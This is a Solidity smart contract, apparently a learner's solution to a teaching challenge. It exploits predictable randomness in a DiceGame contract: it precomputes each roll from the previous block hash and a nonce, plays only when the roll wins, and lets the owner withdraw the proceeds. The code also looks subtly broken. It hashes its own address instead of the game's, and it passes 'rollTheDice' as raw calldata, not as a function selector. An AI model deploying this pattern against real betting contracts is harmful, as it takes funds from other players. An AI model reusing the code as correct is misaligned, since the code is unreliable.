pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw() public onlyOwner {
        (bool success, ) = msg.sender.call{value:address(this).balance}("");
        require(success, "withdraw failed");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();
        console.log("block number:",block.number);
        console.log("nonce number:",nonce);
        // console.log("prevHash:",stringprevHash);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        console.log("Rigged roll:", roll);
        if (roll > 2){
            return;
        }
        (bool success, ) = address(diceGame).call{value:0.03 ether}("rollTheDice");
        require(success, "call failed");
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
    
}
